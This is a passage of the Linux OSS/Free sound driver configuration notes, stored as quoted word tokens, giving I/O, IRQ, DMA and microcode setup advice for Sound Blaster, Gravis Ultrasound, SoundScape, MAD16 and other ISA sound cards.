"level", "services", ".", "It", "'", "s", "recommended", "to", "answer", "'", "y", "'", "to", "each", "of", "these", "questions", ".", "Answer", "'", "n", "'", "only", "if", "you", "know", "you", "will", "not", "need", "the", "option", ".", "\"", "MIDI", "interface", "support", "\"", ",", "-", "Answering", "'", "n", "'", "disables", "/", "dev", "/", "midi", "#", "#", "devices", "and", "access", "to", "any", "MIDI", "ports", "using", "/", "dev", "/", "sequencer", "and", "/", "dev", "/", "music", ".", "This", "option", "also", "affects", "any", "MPU401", "and", "/", "or", "General", "MIDI", "compatible", "devices", ".", "\"", "FM", "synthesizer", "(", "YM3812", "/", "OPL", "-", "3", ")", "support", "\"", ",", "-", "Answer", "'", "y", "'", "here", ".", "\"", "/", "dev", "/", "sequencer", "support", "\"", ",", "-", "Answering", "'", "n", "'", "disables", "/", "dev", "/", "sequencer", "and", "/", "dev", "/", "music", ".", "Entering", "the", "I", "/", "O", ",", "IRQ", "and", "DMA", "config", "parameters", "After", "the", "above", "questions", "the", "configuration", "program", "prompts", "for", "the", "card", "specific", "configuration", "information", ".", "Usually", "just", "a", "set", "of", "I", "/", "O", "address", ",", "IRQ", "and", "DMA", "numbers", "are", "asked", ".", "With", "some", "cards", "the", "program", "asks", "for", "some", "files", "to", "be", "used", "during", "initialization", "of", "the", "card", ".", "For", "example", "many", "cards", "have", "a", "DSP", "chip", "or", "microprocessor", "which", "must", "be", "initialized", "by", "downloading", "a", "program", "(", "microcode", ")", "file", "to", "the", "card", ".", "Instructions", "for", "answering", "these", "questions", "are", "given", "in", "the", "next", "section", ".", "Card", "specific", "information", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "This", "section", "gives", "additional", "instructions", "about", "configuring", "some", "cards", ".", "Please", "refer", "manual", "of", "your", "card", "for", "valid", "I", "/", "O", ",", "IRQ", "and", "DMA", "numbers", ".", "Using", "the", "same", "settings", "with", "DOS", "/", "Windows", "and", "Linux", "is", "recommended", ".", "Using", "different", "values", "could", "cause", "some", "problems", "when", "switching", "between", "different", "operating", "systems", ".", "Sound", "Blasters", "(", "the", "original", "ones", "by", "Creative", ")", "NOTE", "!", "Check", "if", "you", "have", "a", "PnP", "Sound", "Blaster", "(", "cards", "sold", "after", "summer", "1995", "are", "almost", "certainly", "PnP", "ones", ")", ".", "With", "PnP", "cards", "you", "should", "use", "isapnptools", "to", "activate", "them", "(", "see", "above", ")", ".", "It", "'", "s", "possible", "to", "configure", "these", "cards", "to", "use", "different", "I", "/", "O", ",", "IRQ", "and", "DMA", "settings", ".", "Since", "the", "possible", "/", "default", "settings", "have", "changed", "between", "various", "models", ",", "you", "have", "to", "consult", "manual", "of", "your", "card", "for", "the", "proper", "ones", ".", "It", "'", "s", "a", "good", "idea", "to", "use", "the", "same", "values", "than", "with", "DOS", "/", "Windows", ".", "With", "SB", "and", "SB", "Pro", "it", "'", "s", "the", "only", "choice", ".", "SB16", "has", "software", "selectable", "IRQ", "and", "DMA", "channels", "but", "using", "different", "values", "with", "DOS", "and", "Linux", "is", "likely", "to", "cause", "troubles", ".", "The", "DOS", "driver", "is", "not", "able", "to", "reset", "the", "card", "properly", "after", "warm", "boot", "from", "Linux", "if", "Linux", "has", "used", "different", "IRQ", "or", "DMA", "values", ".", "The", "original", "(", "steam", ")", "Sound", "Blaster", "(", "versions", "1", ".", "x", "and", "2", ".", "x", ")", "use", "always", "DMA1", ".", "There", "is", "no", "way", "to", "change", "it", ".", "The", "SB16", "needs", "two", "DMA", "channels", ".", "A", "8", "bit", "one", "(", "1", "or", "3", ")", "is", "required", "for", "8", "bit", "operation", "and", "a", "16", "bit", "one", "(", "5", ",", "6", "or", "7", ")", "for", "the", "16", "bit", "mode", ".", "In", "theory", "it", "'", "s", "possible", "to", "use", "just", "one", "(", "8", "bit", ")", "DMA", "channel", "by", "answering", "the", "8", "bit", "one", "when", "the", "configuration", "program", "asks", "for", "the", "16", "bit", "one", ".", "This", "may", "work", "in", "some", "systems", "but", "is", "likely", "to", "cause", "terrible", "noise", "on", "some", "other", "systems", ".", "It", "'", "s", "possible", "to", "use", "two", "SB16", "/", "32", "/", "64", "at", "the", "same", "time", ".", "To", "do", "this", "you", "should", "first", "configure", "OSS", "/", "Free", "for", "one", "card", ".", "Then", "edit", "local", ".", "h", "manually", "and", "define", "SB2_BASE", ",", "SB2_IRQ", ",", "SB2_DMA", "and", "SB2_DMA2", "for", "the", "second", "one", ".", "You", "can", "'", "t", "get", "the", "OPL3", ",", "MIDI", "and", "EMU8000", "devices", "of", "the", "second", "card", "to", "work", ".", "If", "you", "are", "going", "to", "use", "two", "PnP", "Sound", "Blasters", ",", "ensure", "that", "they", "are", "of", "different", "model", "and", "have", "different", "PnP", "IDs", ".", "There", "is", "no", "way", "to", "get", "two", "cards", "with", "the", "same", "card", "ID", "and", "serial", "number", "to", "work", ".", "The", "easiest", "way", "to", "check", "this", "is", "trying", "if", "isapnptools", "can", "see", "both", "cards", "or", "just", "one", ".", "NOTE", "!", "Don", "'", "t", "enable", "the", "SM", "Games", "option", "(", "asked", "by", "the", "configuration", "program", ")", "if", "you", "are", "not", "101", "%", "sure", "that", "your", "card", "is", "a", "Logitech", "Soundman", "Games", "(", "not", "a", "SM", "Wave", "or", "SM16", ")", ".", "SB", "Clones", "First", "of", "all", ":", "There", "are", "no", "SB16", "clones", ".", "There", "are", "SB", "Pro", "clones", "with", "a", "16", "bit", "mode", "which", "is", "not", "SB16", "compatible", ".", "The", "most", "likely", "alternative", "is", "that", "the", "16", "bit", "mode", "means", "MSS", "/", "WSS", ".", "There", "are", "just", "a", "few", "fully", "100", "%", "hardware", "SB", "or", "SB", "Pro", "compatible", "cards", ".", "I", "know", "just", "Thunderboard", "and", "SM", "Games", ".", "Other", "cards", "require", "some", "kind", "of", "hardware", "initialization", "before", "they", "become", "SB", "compatible", ".", "Check", "if", "your", "card", "was", "listed", "in", "the", "beginning", "of", "this", "file", ".", "In", "this", "case", "you", "should", "follow", "instructions", "for", "your", "card", "later", "in", "this", "file", ".", "For", "other", "not", "fully", "SB", "clones", "you", "may", "try", "initialization", "using", "DOS", "in", "the", "following", "way", ":", "-", "Boot", "DOS", "so", "that", "the", "card", "specific", "driver", "gets", "run", ".", "-", "Hit", "ctrl", "-", "alt", "-", "del", "(", "or", "use", "loadlin", ")", "to", "boot", "Linux", ".", "Don", "'", "t", "switch", "off", "power", "or", "press", "the", "reset", "button", ".", "-", "If", "you", "use", "the", "same", "I", "/", "O", ",", "IRQ", "and", "DMA", "settings", "in", "Linux", ",", "the", "card", "should", "work", ".", "If", "your", "card", "is", "both", "SB", "and", "MSS", "compatible", ",", "I", "recommend", "using", "the", "MSS", "mode", ".", "Most", "cards", "of", "this", "kind", "are", "not", "able", "to", "work", "in", "the", "SB", "and", "the", "MSS", "mode", "simultaneously", ".", "Using", "the", "MSS", "mode", "provides", "16", "bit", "recording", "and", "playback", ".", "ProAudioSpectrum", "16", "and", "compatibles", "PAS16", "has", "a", "SB", "emulation", "chip", "which", "can", "be", "used", "together", "with", "the", "native", "(", "16", "bit", ")", "mode", "of", "the", "card", ".", "To", "enable", "this", "emulation", "you", "should", "configure", "the", "driver", "to", "have", "SB", "support", "too", "(", "this", "has", "been", "changed", "since", "version", "3", ".", "5", "-", "beta9", "of", "this", "driver", ")", ".", "With", "current", "driver", "versions", "it", "'", "s", "also", "possible", "to", "use", "PAS16", "together", "with", "another", "SB", "compatible", "card", ".", "In", "this", "case", "you", "should", "configure", "SB", "support", "for", "the", "other", "card", "and", "to", "disable", "the", "SB", "emulation", "of", "PAS16", "(", "there", "is", "a", "separate", "questions", "about", "this", ")", ".", "With", "PAS16", "you", "can", "use", "two", "audio", "device", "files", "at", "the", "same", "time", ".", "/", "dev", "/", "dsp", "(", "and", "/", "dev", "/", "audio", ")", "is", "connected", "to", "the", "8", "/", "16", "bit", "native", "codec", "and", "the", "/", "dev", "/", "dsp1", "(", "and", "/", "dev", "/", "audio1", ")", "is", "connected", "to", "the", "SB", "emulation", "(", "8", "bit", "mono", "only", ")", ".", "Gravis", "Ultrasound", "There", "are", "many", "different", "revisions", "of", "the", "Ultrasound", "card", "(", "GUS", ")", ".", "The", "earliest", "ones", "(", "pre", "3", ".", "7", ")", "don", "'", "t", "have", "a", "hardware", "mixer", ".", "With", "these", "cards", "the", "driver", "uses", "a", "software", "emulation", "for", "synth", "and", "pcm", "playbacks", ".", "It", "'", "s", "also", "possible", "to", "switch", "some", "of", "the", "inputs", "(", "line", "in", ",", "mic", ")", "off", "by", "setting", "mixer", "volume", "of", "the", "channel", "level", "below", "10", "%", ".", "For", "recording", "you", "have", "to", "select", "the", "channel", "as", "a", "recording", "source", "and", "to", "use", "volume", "above", "10", "%", ".", "GUS", "3", ".", "7", "has", "a", "hardware", "mixer", ".", "GUS", "MAX", "and", "the", "16", "bit", "sampling", "daughtercard", "have", "a", "CS4231", "codec", "chip", "which", "also", "contains", "a", "mixer", ".", "Configuring", "GUS", "is", "simple", ".", "Just", "enable", "the", "GUS", "support", "and", "GUS", "MAX", "or", "the", "16", "bit", "daughtercard", "if", "you", "have", "them", ".", "Note", "that", "enabling", "the", "daughter", "card", "disables", "GUS", "MAX", "driver", ".", "NOTE", "for", "owners", "of", "the", "16", "bit", "daughtercard", ":", "By", "default", "the", "daughtercard", "uses", "/", "dev", "/", "dsp", "(", "and", "/", "dev", "/", "audio", ")", ".", "Command", "\"", "ln", "-", "sf", "/", "dev", "/", "dsp1", "/", "dev", "/", "dsp", "\"", "selects", "the", "daughter", "card", "as", "the", "default", "device", ".", "With", "just", "the", "standard", "GUS", "enabled", "the", "configuration", "program", "prompts", "for", "the", "I", "/", "O", ",", "IRQ", "and", "DMA", "numbers", "for", "the", "card", ".", "Use", "the", "same", "values", "than", "with", "DOS", ".", "With", "the", "daughter", "card", "option", "enabled", "you", "will", "be", "prompted", "for", "the", "I", "/", "O", ",", "IRQ", "and", "DMA", "numbers", "for", "the", "daughter", "card", ".", "You", "have", "to", "use", "different", "I", "/", "O", "and", "DMA", "values", "than", "for", "the", "standard", "GUS", ".", "The", "daughter", "card", "permits", "simultaneous", "recording", "and", "playback", ".", "Use", "/", "dev", "/", "dsp", "(", "the", "daughtercard", ")", "for", "recording", "and", "/", "dev", "/", "dsp1", "(", "GUS", "GF1", ")", "for", "playback", ".", "GUS", "MAX", "uses", "the", "same", "I", "/", "O", "address", "and", "IRQ", "settings", "than", "the", "original", "GUS", "(", "GUS", "MAX", "=", "GUS", "+", "a", "CS4231", "codec", ")", ".", "In", "addition", "an", "extra", "DMA", "channel", "may", "be", "used", ".", "Using", "two", "DMA", "channels", "permits", "simultaneous", "playback", "using", "two", "devices", "(", "dev", "/", "dsp0", "and", "/", "dev", "/", "dsp1", ")", ".", "The", "second", "DMA", "channel", "is", "required", "for", "full", "duplex", "audio", ".", "To", "enable", "the", "second", "DMA", "channels", ",", "give", "a", "valid", "DMA", "channel", "when", "the", "config", "program", "asks", "for", "the", "GUS", "MAX", "DMA", "(", "entering", "-", "1", "disables", "the", "second", "DMA", ")", ".", "Using", "16", "bit", "DMA", "channels", "(", "5", ",", "6", "or", "7", ")", "is", "recommended", ".", "If", "you", "have", "problems", "in", "recording", "with", "GUS", "MAX", ",", "you", "could", "try", "to", "use", "just", "one", "8", "bit", "DMA", "channel", ".", "Recording", "will", "not", "work", "with", "one", "DMA", "channel", "if", "it", "'", "s", "a", "16", "bit", "one", ".", "Microphone", "input", "of", "GUS", "MAX", "is", "connected", "to", "mixer", "in", "little", "bit", "nonstandard", "way", ".", "There", "is", "actually", "two", "microphone", "volume", "controls", ".", "Normal", "\"", "mic", "\"", "controls", "only", "recording", "level", ".", "Mixer", "control", "\"", "speaker", "\"", "is", "used", "to", "control", "volume", "of", "microphone", "signal", "connected", "directly", "to", "line", "/", "speaker", "out", ".", "So", "just", "decrease", "volume", "of", "\"", "speaker", "\"", "if", "you", "have", "problems", "with", "microphone", "feedback", ".", "GUS", "ACE", "works", "too", "but", "any", "attempt", "to", "record", "or", "to", "use", "the", "MIDI", "port", "will", "fail", ".", "GUS", "PnP", "(", "with", "RAM", ")", "is", "partially", "supported", "but", "it", "needs", "to", "be", "initialized", "using", "DOS", "or", "isapnptools", "before", "starting", "the", "driver", ".", "MPU401", "and", "Windows", "Sound", "System", "Again", ".", "Don", "'", "t", "enable", "these", "options", "in", "case", "your", "card", "is", "listed", "somewhere", "else", "in", "this", "file", ".", "Configuring", "these", "cards", "is", "obvious", "(", "or", "it", "should", "be", ")", ".", "With", "MSS", "you", "should", "probably", "enable", "the", "OPL3", "synth", "also", "since", "most", "MSS", "compatible", "cards", "have", "it", ".", "However", "check", "that", "this", "is", "true", "before", "enabling", "OPL3", ".", "Sound", "driver", "supports", "more", "than", "one", "MPU401", "compatible", "cards", "at", "the", "same", "time", "but", "the", "config", "program", "asks", "config", "info", "for", "just", "the", "first", "of", "them", ".", "Adding", "the", "second", "or", "third", "MPU", "interfaces", "must", "be", "done", "manually", "by", "editing", "sound", "/", "local", ".", "h", "(", "after", "running", "the", "config", "program", ")", ".", "Add", "defines", "for", "MPU2_BASE", "&", "MPU2_IRQ", "(", "and", "MPU3_BASE", "&", "MPU3_IRQ", ")", "to", "the", "file", ".", "CAUTION", "!", "The", "default", "I", "/", "O", "base", "of", "Adaptec", "AHA", "-", "1542", "SCSI", "controller", "is", "0x330", "which", "is", "also", "the", "default", "of", "the", "MPU401", "driver", ".", "Don", "'", "t", "configure", "the", "sound", "driver", "to", "use", "0x330", "as", "the", "MPU401", "base", "if", "you", "have", "a", "AHA1542", ".", "The", "kernel", "will", "not", "boot", "if", "you", "make", "this", "mistake", ".", "PSS", "Even", "the", "PSS", "cards", "are", "compatible", "with", "SB", ",", "MSS", "and", "MPU401", ",", "you", "must", "not", "enable", "these", "options", "when", "configuring", "the", "driver", ".", "The", "configuration", "program", "handles", "these", "options", "itself", ".", "(", "You", "may", "use", "the", "SB", ",", "MPU", "and", "MSS", "options", "together", "with", "PSS", "if", "you", "have", "another", "card", "on", "the", "system", ")", ".", "The", "PSS", "driver", "enables", "MSS", "and", "MPU401", "modes", "of", "the", "card", ".", "SB", "is", "not", "enabled", "since", "it", "doesn", "'", "t", "work", "concurrently", "with", "MSS", ".", "The", "driver", "loads", "also", "a", "DSP", "algorithm", "which", "is", "used", "to", "for", "the", "general", "MIDI", "emulation", ".", "The", "algorithm", "file", "(", ".", "ld", ")", "is", "read", "by", "the", "config", "program", "and", "written", "to", "a", "file", "included", "when", "the", "pss", ".", "c", "is", "compiled", ".", "For", "this", "reason", "the", "config", "program", "asks", "if", "you", "want", "to", "download", "the", "file", ".", "Use", "the", "genmidi", ".", "ld", "file", "distributed", "with", "the", "DOS", "/", "Windows", "drivers", "of", "the", "card", "(", "don", "'", "t", "use", "the", "mt32", ".", "ld", ")", ".", "With", "some", "cards", "the", "file", "is", "called", "'", "synth", ".", "ld", "'", ".", "You", "must", "have", "access", "to", "the", "file", "when", "configuring", "the", "driver", ".", "The", "easiest", "way", "is", "to", "mount", "the", "DOS", "partition", "containing", "the", "file", "with", "Linux", ".", "It", "'", "s", "possible", "to", "load", "your", "own", "DSP", "algorithms", "and", "run", "them", "with", "the", "card", ".", "Look", "at", "the", "directory", "pss_test", "of", "snd", "-", "util", "-", "3", ".", "0", ".", "tar", ".", "gz", "for", "more", "info", ".", "AudioTrix", "Pro", "You", "have", "to", "enable", "the", "OPL3", "and", "SB", "(", "not", "SB", "Pro", "or", "SB16", ")", "drivers", "in", "addition", "to", "the", "native", "AudioTrix", "driver", ".", "Don", "'", "t", "enable", "MSS", "or", "MPU", "drivers", ".", "Configuring", "ATP", "is", "little", "bit", "tricky", "since", "it", "uses", "so", "many", "I", "/", "O", ",", "IRQ", "and", "DMA", "numbers", ".", "Using", "the", "same", "values", "than", "with", "DOS", "/", "Win", "is", "a", "good", "idea", ".", "Don", "'", "t", "attempt", "to", "use", "the", "same", "IRQ", "or", "DMA", "channels", "twice", ".", "The", "SB", "mode", "of", "ATP", "is", "implemented", "so", "the", "ATP", "driver", "just", "enables", "SB", "in", "the", "proper", "address", ".", "The", "SB", "driver", "handles", "the", "rest", ".", "You", "have", "to", "configure", "both", "the", "SB", "driver", "and", "the", "SB", "mode", "of", "ATP", "to", "use", "the", "same", "IRQ", ",", "DMA", "and", "I", "/", "O", "settings", ".", "Also", "the", "ATP", "has", "a", "microcontroller", "for", "the", "General", "MIDI", "emulation", "(", "OPL4", ")", ".", "For", "this", "reason", "the", "driver", "asks", "for", "the", "name", "of", "a", "file", "containing", "the", "microcode", "(", "TRXPRO", ".", "HEX", ")", ".", "This", "file", "is", "usually", "located", "in", "the", "directory", "where", "the", "DOS", "drivers", "were", "installed", ".", "You", "must", "have", "access", "to", "this", "file", "when", "configuring", "the", "driver", ".", "If", "you", "have", "the", "effects", "daughtercard", ",", "it", "must", "be", "initialized", "by", "running", "the", "setfx", "program", "of", "snd", "-", "util", "-", "3", ".", "0", ".", "tar", ".", "gz", "package", ".", "This", "step", "is", "not", "required", "when", "using", "the", "(", "future", ")", "binary", "distribution", "version", "of", "the", "driver", ".", "Ensoniq", "SoundScape", "NOTE", "!", "The", "new", "PnP", "SoundScape", "is", "not", "supported", "yet", ".", "Soundscape", "compatible", "cards", "made", "by", "Reveal", "don", "'", "t", "work", "with", "Linux", ".", "They", "use", "older", "revision", "of", "the", "Soundscape", "chipset", "which", "is", "not", "fully", "compatible", "with", "newer", "cards", "made", "by", "Ensoniq", ".", "The", "SoundScape", "driver", "handles", "initialization", "of", "MSS", "and", "MPU", "supports", "itself", "so", "you", "don", "'", "t", "need", "to", "enable", "other", "drivers", "than", "SoundScape", "(", "enable", "also", "the", "/", "dev", "/", "dsp", ",", "/", "dev", "/", "sequencer", "and", "MIDI", "supports", ")", ".", "!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!", "!", "!!", "!!", "!", "!!", "!", "!", "!!", "!!", "NOTE", "!", "Before", "version", "3", ".", "5", "-", "beta6", "there", "WERE", "two", "sets", "of", "audio", "!", "!!", "!", "!", "!!", "!!", "device", "files", "(", "/", "dev", "/", "dsp0", "and", "/", "dev", "/", "dsp1", ")", ".", "The", "first", "one", "WAS", "!", "!!", "!", "!", "!!", "!!", "used", "only", "for", "card", "initialization", "and", "the", "second", "for", "audio", "!", "!!", "!", "!", "!!", "!!", "purposes", ".", "It", "WAS", "required", "to", "change", "/", "dev", "/", "dsp", "(", "a", "symlink", ")", "to", "!", "!!", "!", "!", "!!", "!!", "point", "to", "/", "dev", "/", "dsp1", ".", "!", "!!", "!", "!", "!!", "!!", "!", "!!", "!", "!", "!!", "!!", "This", "is", "not", "required", "with", "OSS", "versions", "3", ".", "5", "-", "beta6", "and", "later", "!", "!!", "!", "!", "!!", "!!", "since", "there", "is", "now", "just", "one", "audio", "device", "file", ".", "Please", "!", "!!", "!", "!", "!!", "!!", "change", "/", "dev", "/", "dsp", "to", "point", "back", "to", "/", "dev", "/", "dsp0", "if", "you", "are", "!", "!!", "!", "!", "!!", "!!", "upgrading", "from", "an", "earlier", "driver", "version", "using", "!", "!!", "!", "!", "!!", "!!", "(", "cd", "/", "dev", ";", "rm", "dsp", ";", "ln", "-", "s", "dsp0", "dsp", ")", ".", "!", "!!", "!", "!", "!!", "!!", "!", "!!", "!", "!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!!", "!", "The", "configuration", "program", "asks", "one", "DMA", "channel", "and", "two", "interrupts", ".", "One", "IRQ", "and", "one", "DMA", "is", "used", "by", "the", "MSS", "codec", ".", "The", "second", "IRQ", "is", "required", "for", "the", "MPU401", "mode", "(", "you", "have", "to", "use", "different", "IRQs", "for", "both", "purposes", ")", ".", "There", "were", "earlier", "two", "DMA", "channels", "for", "SoundScape", "but", "the", "current", "driver", "version", "requires", "just", "one", ".", "The", "SoundScape", "card", "has", "a", "Motorola", "microcontroller", "which", "must", "initialized", "_after_", "boot", "(", "the", "driver", "doesn", "'", "t", "initialize", "it", "during", "boot", ")", ".", "The", "initialization", "is", "done", "by", "running", "the", "'", "ssinit", "'", "program", "which", "is", "distributed", "in", "the", "snd", "-", "util", "-", "3", ".", "0", ".", "tar", ".", "gz", "package", ".", "You", "have", "to", "edit", "two", "defines", "in", "the", "ssinit", ".", "c", "and", "then", "compile", "the", "program", ".", "You", "may", "run", "ssinit", "manually", "(", "after", "each", "boot", ")", "or", "add", "it", "to", "/", "etc", "/", "rc", ".", "d", "/", "rc", ".", "local", ".", "The", "ssinit", "program", "needs", "the", "microcode", "file", "that", "comes", "with", "the", "DOS", "/", "Windows", "driver", "of", "the", "card", ".", "You", "will", "need", "to", "use", "version", "1", ".", "30", ".", "00", "or", "later", "of", "the", "microcode", "file", "(", "sndscape", ".", "co0", "or", "sndscape", ".", "co1", "depending", "on", "your", "card", "model", ")", ".", "THE", "OLD", "sndscape", ".", "cod", "WILL", "NOT", "WORK", ".", "IT", "WILL", "HANG", "YOUR", "MACHINE", ".", "The", "only", "way", "to", "get", "the", "new", "microcode", "file", "is", "to", "download", "and", "install", "the", "DOS", "/", "Windows", "driver", "from", "ftp", ":", "//", "ftp", ".", "ensoniq", ".", "com", "/", "pub", ".", "Then", "you", "have", "to", "select", "the", "proper", "microcode", "file", "to", "use", ":", "soundscape", ".", "co0", "is", "the", "right", "one", "for", "most", "cards", "and", "sndscape", ".", "co1", "is", "for", "few", "(", "older", ")", "cards", "made", "by", "Reveal", "and", "/", "or", "Spea", ".", "The", "driver", "has", "capability", "to", "detect", "the", "card", "version", "during", "boot", ".", "Look", "at", "the", "boot", "log", "messages", "in", "/", "var", "/", "adm", "/", "messages", "and", "locate", "the", "sound", "driver", "initialization", "message", "for", "the", "SoundScape", "card", ".", "If", "the", "driver", "displays", "string", "<", "Ensoniq", "Soundscape", "(", "old", ")", ">,", "you", "have", "an", "old", "card", "and", "you", "will", "need", "to", "use", "sndscape", ".", "co1", ".", "For", "other", "cards", "use", "soundscape", ".", "co0", ".", "New", "Soundscape", "revisions", "such", "as", "Elite", "and", "PnP", "use", "code", "files", "with", "higher", "numbers", "(", ".", "co2", ",", ".", "co3", ",", "etc", ".", ").", "NOTE", "!", "Ensoniq", "Soundscape", "VIVO", "is", "not", "compatible", "with", "other", "Soundscape", "cards", ".", "Currently", "it", "'", "s", "possible", "to", "use", "it", "in", "Linux", "only", "with", "OSS", "/", "Linux", "drivers", ".", "Check", "/", "var", "/", "adm", "/", "messages", "after", "running", "ssinit", ".", "The", "driver", "prints", "the", "board", "version", "after", "downloading", "the", "microcode", "file", ".", "That", "version", "number", "must", "match", "the", "number", "in", "the", "name", "of", "the", "microcode", "file", "(", "extension", ")", ".", "Running", "ssinit", "with", "a", "wrong", "version", "of", "the", "sndscape", ".", "co", "?", "file", "is", "not", "dangerous", "as", "long", "as", "you", "don", "'", "t", "try", "to", "use", "a", "file", "called", "sndscape", ".", "cod", ".", "If", "you", "have", "initialized", "the", "card", "using", "a", "wrong", "microcode", "file", "(", "sounds", "are", "terrible", ")", ",", "just", "modify", "ssinit", ".", "c", "to", "use", "another", "microcode", "file", "and", "try", "again", ".", "It", "'", "s", "possible", "to", "use", "an", "earlier", "version", "of", "sndscape", ".", "co", "[", "01", "]", "but", "it", "may", "sound", "weird", ".", "MAD16", "(", "Pro", ")", "and", "Mozart", "You", "need", "to", "enable", "just", "the", "MAD16", "/", "Mozart", "support", "when", "configuring", "the", "driver", ".", "_Don", "'", "t_", "enable", "SB", ",", "MPU401", "or", "MSS", ".", "However", "you", "will", "need", "the", "/", "dev", "/", "audio", ",", "/", "dev", "/", "sequencer", "and", "MIDI", "supports", ".", "Mozart", "and", "OPTi", "82C928", "(", "the", "original", "MAD16", ")", "chips", "don", "'", "t", "support", "MPU401", "mode", "so", "enter", "just", "0", "when", "the", "configuration", "program", "asks", "the", "MPU", "/", "MIDI", "I", "/", "O", "base", ".", "The", "MAD16", "Pro", "(", "OPTi", "82C929", ")", "and", "82C930", "chips", "have", "MPU401", "mode", ".", "TB", "Tropez", "is", "based", "on", "the", "82C929", "chip", ".", "It", "has", "two", "MIDI", "ports", ".", "The", "one", "connected", "to", "the", "MAD16", "chip", "is", "the", "second", "one", "(", "there", "is", "a", "second", "MIDI", "connector", "/", "pins", "somewhere", "?", "?)", ".", "If", "you", "have", "not", "connected", "the", "second", "MIDI", "port", ",", "just", "disable", "the", "MIDI", "port", "of", "MAD16", ".", "The", "'", "Maui", "'", "compatible", "synth", "of", "Tropez", "is", "jumper", "configurable", "and", "not", "connected", "to", "the", "MAD16", "chip", "(", "the", "Maui", "driver", "can", "be", "used", "with", "it", ")", ".", "Some", "MAD16", "based", "cards", "may", "cause", "feedback", ",", "whistle", "or", "terrible", "noise", "if", "the", "line3", "mixer", "channel", "is", "turned", "too", "high", ".", "This", "happens", "at", "least", "with", "Shuttle", "Sound", "System", ".", "Current", "driver", "versions", "set", "volume", "of", "line3", "low", "enough", "so", "this", "should", "not", "be", "a", "problem", ".", "If", "you", "have", "a", "MAD16", "card", "which", "have", "an", "OPL4", "(", "FM", "+", "Wave", "table", ")", "synthesizer", "chip", "(", "_not_", "an", "OPL3", ")", ",", "you", "have", "to", "append", "a", "line", "containing", "#", "define", "MAD16_OPL4", "to", "the", "file", "linux", "/", "drivers", "/", "sound", "/", "local", ".", "h", "(", "after", "running", "make", "config", ")", ".", "MAD16", "cards", "having", "a", "CS4231", "codec", "support", "full", "duplex", "mode", ".", "This", "mode", "can", "be", "enabled", "by", "configuring", "the", "card", "to", "use", "two", "DMA", "channels", ".", "Possible", "DMA", "channel", "pairs", "are", ":", "0", "&", "1", ",", "1", "&", "0", "and", "3", "&", "0", ".", "NOTE", "!", "Cards", "having", "an", "OPTi", "82C924", "/", "82C925", "chip", "work", "with", "OSS", "/", "Free", "only", "in", "non", "-", "PnP", "mode", "(", "usually", "jumper", "selectable", ")", ".", "The", "PnP", "mode", "is", "supported", "only", "by", "OSS", "/", "Linux", ".", "MV", "Jazz", "(", "ProSonic", ")", "The", "Jazz16", "driver", "is", "just", "a", "hack", "made", "to", "the", "SB", "Pro", "driver", ".", "However", "it", "works", "fairly", "well", ".", "You", "have", "to", "enable", "SB", ",", "SB", "Pro", "(", "_not_", "SB16", ")", "and", "MPU401", "supports", "when", "configuring", "the", "driver", ".", "The", "configuration", "program", "asks", "later", "if", "you", "want", "support", "for", "MV", "Jazz16", "based", "cards", "(", "after", "asking", "SB", "base", "address", ")", ".", "Answer", "'", "y", "'", "here", "and", "the", "driver", "asks", "the", "second", "(", "16", "bit", ")", "DMA", "channel", ".", "The", "Jazz16", "driver", "uses", "the", "MPU401", "driver", "in", "a", "way", "which", "will", "cause", "problems", "if", "you", "have", "another", "MPU401", "compatible", "card", ".", "In", "this", "case", "you", "must", "give", "address", "of", "the", "Jazz16", "based", "MPU401", "interface", "when", "the", "config", "program", "prompts", "for", "the", "MPU401", "information", ".", "Then", "look", "at", "the", "MPU401", "specific", "section", "for", "instructions", "about", "configuring", "more", "than", "one", "MPU401", "cards", ".", "Logitech", "Soundman", "Wave", "Read", "the", "above", "MV", "Jazz", "specific", "instructions", "first", ".", "The", "Logitech", "SoundMan", "Wave", "(", "don", "'", "t", "confuse", "this", "with", "the", "SM16", "or", "SM", "Games", ")", "is", "a", "MV", "Jazz", "based", "card", "which", "has", "an", "additional", "OPL4", "based", "wave", "table", "synthesizer", ".", "The", "OPL4", "chip", "is", "handled", "by", "an", "on", "board", "microcontroller", "which", "must", "be", "initialized", "during", "boot", ".", "The", "config", "program", "asks", "if", "you", "have", "a", "SM", "Wave", "immediately", "after", "asking", "the", "second", "DMA", "channel", "of", "jazz16", ".", "If", "you", "answer", "'", "y", "'", ",", "the", "config", "program", "will", "ask", "name", "of", "the", "file", "containing", "code", "to", "be", "loaded", "to", "the", "microcontroller", ".", "The", "file", "is", "usually", "called", "MIDI0001", ".", "BIN", "and", "it", "'", "s", "located", "in", "the", "DOS", "/", "Windows", "driver", "directory", ".", "The", "file", "may", "also", "be", "called", "as", "TSUNAMI", ".", "BIN", "or", "something", "else", "(", "older", "cards", "?", ").", "The", "OPL4", "synth", "will", "be", "inaccessible", "without", "loading", "the", "microcontroller", "code", ".", "Also", "remember", "to", "enable", "SB", "MPU401", "support", "if", "you", "want", "to", "use", "the", "OPL4", "mode", ".", "(", "Don", "'", "t", "enable", "the", "'", "normal", "'", "MPU401", "device", "as", "with", "some", "earlier", "driver", "versions", "(", "pre", "3", ".", "5", "-", "alpha8", ")", ").", "NOTE", "!", "Don", "'", "t", "answer", "'", "y", "'", "when", "the", "driver", "asks", "about", "SM", "Games", "support", "(", "the", "next", "question", "after", "the", "MIDI0001", ".", "BIN", "name", ")", ".", "However", "answering", "'", "y", "'", "doesn", "'", "t", "cause", "damage", "your", "computer", "so", "don", "'", "t", "panic", ".", "Sound", "Galaxies", "There", "are", "many", "different", "Sound", "Galaxy", "cards", "made", "by", "Aztech", ".", "The", "8", "bit", "ones", "are", "fully", "SB", "or", "SB", "Pro", "compatible", "and", "there", "should", "be", "no", "problems", "with", "them", ".", "The", "older", "16", "bit", "cards", "(", "SG", "Pro16", ",", "SG", "NX", "Pro16", ",", "Nova", "and", "Lyra", ")", "have", "an", "EEPROM", "chip", "for", "storing", "the", "configuration", "data", ".", "There", 